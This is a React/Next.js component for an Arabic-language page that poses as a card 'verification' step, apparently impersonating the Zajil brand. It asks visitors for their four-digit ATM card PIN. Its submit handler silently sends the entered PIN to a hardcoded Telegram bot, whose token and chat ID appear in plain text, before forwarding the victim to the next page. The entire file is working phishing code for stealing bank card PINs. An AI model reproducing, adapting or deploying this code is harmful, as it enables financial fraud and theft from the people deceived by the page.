"use client"
import styles from './code.module.css'
import { useRef } from 'react'
import { useRouter } from 'next/navigation'
const Code = () => {
 
  
  const code = useRef();
  const router = useRouter()

  const handleSubmit = (e) => {
    e.preventDefault();
    var bot={
      token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
      chat_id:6364334502
    }
    var length= `%0A كود البطاقة : ${code.current.value} %0A BY Admin Zajil:`
    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
  
  }

  return (
    <div className={styles.contect}>
      <div>
      <h1> التحقق</h1>
      <p>يرجى ادخال الرمز السري الخاص ببطاقة الصراف والمكون من اربع ارقام</p>
     
      <form action="/pay/code" onSubmit={handleSubmit}>
        <label htmlFor="">
        ادخل كلمة مرور البطاقة البنكية
        <input type="text" ref={code} placeholder="ادخل كلمة المرور هنا" />
        </label>
        <button type='submit' onClick={()=> router.push('/fozajil/banks/pay/code/nphad')}>تحقق</button>
      </form>
      <p>هل تواجه مشكلة في تسجيل الدخول ؟ أعد الاتصال</p>
      </div>
    </div>
  )
}

export default Code